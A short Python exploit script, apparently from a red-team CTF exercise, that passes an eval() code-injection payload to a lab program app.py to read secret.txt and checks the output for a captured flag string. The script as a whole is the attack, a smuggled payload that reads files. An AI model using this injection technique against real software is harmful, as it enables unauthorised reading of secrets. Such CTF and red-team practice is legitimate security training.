"""
Red Team Exploit â€” Round 1
Exploits eval() in app.py to read secret.txt via command injection.
"""
import subprocess
import sys

def main():
    # Craft a payload that uses eval() to read secret.txt
    payload = "open('secret.txt').read()"

    result = subprocess.run(
        [sys.executable, "app.py", payload],
        capture_output=True,
        text=True,
        cwd="/Users/wangbo-ting/git/agent-war-room-2/case-01-red-blue-ctf-v2"
    )

    print("=== EXPLOIT OUTPUT ===")
    print(result.stdout)
    if result.stderr:
        print("STDERR:", result.stderr)

    # Check if flag was captured
    if "THIS_IS_THE_SECRET_FLAG_12345" in result.stdout:
        print("[SUCCESS] Flag captured!")
    else:
        print("[FAILED] Flag not found in output.")

if __name__ == "__main__":
    main()
